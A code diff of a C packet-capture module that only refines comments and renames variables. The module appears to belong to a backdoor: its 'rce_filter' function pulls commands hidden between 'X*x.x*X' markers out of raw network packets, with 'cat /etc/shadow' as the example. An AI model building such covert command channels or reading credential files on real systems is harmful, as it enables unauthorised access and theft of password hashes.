@@ -132,9 +132,9 @@ void xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {
  *
  * Such as:
  *    raw:  X*x.x*Xcat /etc/shadowX*x.x*X
- *    rce: /etc/shadow
- * @param raw
- * @param rce
+ *    rce: cat /etc/shadow
+ * @param raw pointer to raw bytes
+ * @param rce pointer to memory to write the command to
  * @return 1 success, 0 failure
  */
 int rce_filter(char *raw, char *rce) {
@@ -163,12 +163,17 @@ int rce_filter(char *raw, char *rce) {
  * raw network packets into a ring buffer at runtime.
  *
  * Run this in a unique thread to process packets on the backend.
+ *
+ * Basically write TCP packets as `struct xcap_ip_packet` into the ringbuffer.
+ * (Where the ringbuffer only holds pointer to these packets)
+ * In order to reassemble a TCP stream.
+ *
  * @param v_dev_name
  * @return
  */
 void *xcap(void *v_dev_name) {
   char *dev_name = (char *)v_dev_name;
-  char filter_exp[] = "";
+  char filter_exp[] = ""; // empty BPF filter, we want to see all packets
   int cycle = 0;
 
   pcap_t *handle;
@@ -176,9 +181,9 @@ void *xcap(void *v_dev_name) {
   bpf_u_int32 mask;
   bpf_u_int32 net;
 
-  struct bpf_program fp;
+  struct bpf_program filter_program; // filter pointer. as in old school BPF filter, for filtering network packets
   struct pcap_pkthdr header;
-  struct ether_header *ep;
+  struct ether_header *ethernet_hdr_ptr;
   unsigned short ether_type;
   const u_char *packet;
   struct ip *iph;
@@ -213,8 +218,8 @@ void *xcap(void *v_dev_name) {
 
   while (runtime__xcap) {
     packet = pcap_next(handle, &header);
-    ep = (struct ether_header *)packet;
-    ether_type = ntohs(ep->ether_type);
+    ethernet_hdr_ptr = (struct ether_header *)packet;
+    ether_type = ntohs(ethernet_hdr_ptr->ether_type);
     if (ether_type != ETHERTYPE_IP) {
       continue;
     }
